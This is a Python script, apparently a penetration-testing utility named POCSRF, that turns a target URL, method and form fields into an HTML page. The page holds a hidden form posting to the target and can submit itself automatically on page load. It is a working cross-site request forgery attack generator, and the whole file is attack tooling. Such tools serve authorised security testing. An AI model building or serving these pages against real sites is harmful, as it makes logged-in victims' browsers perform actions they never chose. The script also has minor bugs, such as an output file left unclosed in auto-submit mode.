import re
import sys
import time
import cgi
import html

class CSRF_PoC_Generator():
    
    def __init__(self, method, uri, data, encoding, auto_submit, filename, verbose_mode):
       
        self.method = method
        self.uri = uri
        self.data = data
        self.encoding = encoding
        self.auto_submit = auto_submit
        self.filename = filename
        self.verbose_mode = verbose_mode

        if (self.verbose_mode):
            print ("\nParsing input data...")
            time.sleep(1)

        self.data_set = re.findall(r'([A-Za-z0-9@."]+)', data)
        self.names = []
        self.values = []

    
        for i in range (0, len(self.data_set)):
            if (i % 2 == 0):
                self.names.append(self.data_set[i])
            else:
                self.values.append(html.escape(self.data_set[i]))
        
        print("\nTesting Output: \n\tself.names: {} \n\tself.values: {}".format(self.names, self.values))

    def createRequest(self):
        
        filename = self.filename
        if (filename == None):
            filename = "CSRF_PoC.html"
       
        form_lines = ""
        
        if (self.verbose_mode):
            print ("\nCreating CSRF form data...")
            time.sleep(1)

        for i in range (0, len(self.data_set)//2):
            if (self.method == "POST"):
                form_lines += "<input type=\"hidden\" value={} name={} />\n\t".format(self.values[i],self.names[i])
       
       
        print("\nTesting Output: \n\t form_lines: {}".format(form_lines))

        HTML_CODE = "<html>\n<head>\n\t<title>CSRF PoC</title>\n\r</head>\n<body>\n<script>history.pushState('', '', '/')</script>\n\t<form  method=\"{}\" action=\"{}\">\n\t{}<input type=\"submit\" value=\"Submit Request\">\n\t</form>\n</body>\n</html>".format(self.method, self.uri, form_lines)
       
        HTML_CODE_AUTO_SUBMIT = "<html>\n<head>\n\t<title>CSRF PoC</title>\n\r</head>\n<body>\n<script>history.pushState('', '', '/')</script>\n\t<form  method=\"{}\" action=\"{}\">\n\t{}<input type=\"submit\" value=\"Submit Request\">\n\t</form>\n\t<script>\n\t\tdocument.forms[0].submit();\n\t</script>\n</body>\n</html>".format(self.method, self.uri, form_lines)

        file = open(str(filename), "w")
        if (self.auto_submit):
            file.write(HTML_CODE_AUTO_SUBMIT)
        else:
            file.write(HTML_CODE)
            file.close()
        
        print("\nComplete!")

def main():
    
    print ("""


 ______   ______     ______     ______     ______     ______  
/\  == \ /\  __ \   /\  ___\   /\  ___\   /\  == \   /\  ___\ 
\ \  _-/ \ \ \/\ \  \ \ \____  \ \___  \  \ \  __<   \ \  __\ 
 \ \_\    \ \_____\  \ \_____\  \/\_____\  \ \_\ \_\  \ \_\   
  \/_/     \/_____/   \/_____/   \/_____/   \/_/ /_/   \/_/   
                                                              
Version - 1.0.2
  """)   
    
    if ("-h" in sys.argv or "--help" in sys.argv or len(sys.argv) < 3):
        print("POCSRF.py\n\nRequired: <URI> <METHOD> <NAME_1=VALUE_1,NAME_2=VALUE_2,...>\n\nOptional:  \n-e --encoding:\tEncoding type (text/plain, www/application, etc) default : None\n-a --auto:\tAutomatically submit the request when the page is loaded \n-of --filename:\tName of the output file (default : CSRF_PoC.html)\n-v --verbose:\tVerbose mode\n")
        sys.exit()
    
    uri_regex = 'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+'

    URI = sys.argv[1]
    METHOD = sys.argv[2]
    DATA = sys.argv[3]
    ENCODING = " "
    AUTO_SUBMIT = False
    OUTPUT_FILE = None
    VERBOSE = False

    if(re.findall(uri_regex, URI) == []):
        print ("Invalid URI : {}".format(URI))
        sys.exit()
    
    if ("-e" in sys.argv or "--encoding" in sys.argv):
        try:
            ENCODING = sys.argv[sys.argv.index('-e')+1]
        except ValueError:
            ENCODING = sys.argv[sys.argv.index("--encoding")+1]
    
    if ("-a" in sys.argv or "--auto" in sys.argv):
        AUTO_SUBMIT = True

    if ("-of" in sys.argv or "--filename" in sys.argv):
        try:
            OUTPUT_FILE = sys.argv[sys.argv.index("-of")+1]
        except ValueError:
            OUTPUT_FILE = sys.argv[sys.argv.index("--filename")+1]
    
    if ("-v" in sys.argv or "--verbose" in sys.argv):
        VERBOSE = True

    
    print ("\n Testing output: sys.argv: {}\n".format(sys.argv))
    
    new_PoC = CSRF_PoC_Generator(METHOD,URI,DATA,ENCODING,AUTO_SUBMIT,OUTPUT_FILE, VERBOSE)
    new_PoC.createRequest()

main()
